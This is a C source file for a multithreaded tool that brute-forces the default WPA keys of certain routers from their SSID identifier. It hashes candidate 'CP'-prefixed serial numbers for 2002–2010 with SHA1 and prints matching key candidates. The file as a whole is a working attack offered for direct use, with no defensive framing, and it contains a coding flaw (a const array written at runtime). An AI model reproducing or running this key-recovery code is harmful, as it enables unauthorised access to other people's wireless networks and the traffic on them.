#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <pthread.h>
#include <openssl/sha.h>

#include "utility.h"

#define YEAR_BEGIN_NUM 2 //This "hack" is known to work with models made during the year 2002
#define NUM_OF_YEARS 8  //and work for all models made up to and including 2010. 2 + 8 = 10

//the identifying part of the ssid converted back to integers
const unsigned char ident[3];

void usage(const char *name)
{
	printf("Usage: %s ssid_identifier\nExample ssid_identifier: CDEA15\n", name);
}

/* Run from a thread. 
 * arg should point to an integer containing the year number
 * to calculate the wpa keys for.
 * Will check if the WPA keys could be valid for 
 */
void *calc_wpa_key(void *arg)
{
	//Possible characters that make up the key
	const char chars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	
	int year = *((int *)arg);
	char str[3];
	char serial[13];
	unsigned char sha1_out[20];
	char sha1_out_str[41];
	
	for (int week = 1; week < 53; week++) //53 = maximum number of weeks in a year.
	{
		for (int i = 0; i < 36; i++) //36 = amount of possible characters (sizeof chars).
		{
			for (int j = 0; j < 36; j++)
			{
				for (int k = 0; k < 36; k++)
				{
					str[0] = chars[i];
					str[1] = chars[j];
					str[2] = chars[k];
					
					sprintf(serial, "CP%02d%02d%X%X%X", year, week, str[0], str[1], str[2]);
					
					SHA1((const unsigned char*)serial, strlen(serial), sha1_out);
					
					if (memcmp(&sha1_out[19] - 2, ident, 3) == 0)
					{
						sha1_to_str(sha1_out, sha1_out_str);
						sha1_out_str[10] = '\0';
						printf("Possible Key Found: %s\n", sha1_out_str);
					}
				}
			}
		}
	}
	
	return NULL;
}

int main(int argc, char *argv[])
{
	
	if (argc != 2)
	{
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	if (strlen(argv[1]) != 6)
	{
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	str_to_upper(argv[1]);

	//convert the hexidecimal number represented in the string back to their "true" form
	if (sscanf(argv[1], "%02hhX%02hhX%02hhX", ident, &ident[1], &ident[2]) != 3)
	{
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	pthread_t thread[NUM_OF_YEARS];
	int year[NUM_OF_YEARS];
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		year[i] = YEAR_BEGIN_NUM + i;
		if(pthread_create(&thread[i], NULL, &calc_wpa_key, &year[i]))
		{
    		printf("Error creating thread\n");
        	return EXIT_FAILURE;
		}
	}
	
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		pthread_join(thread[i], NULL);
	}

	return EXIT_SUCCESS;
}
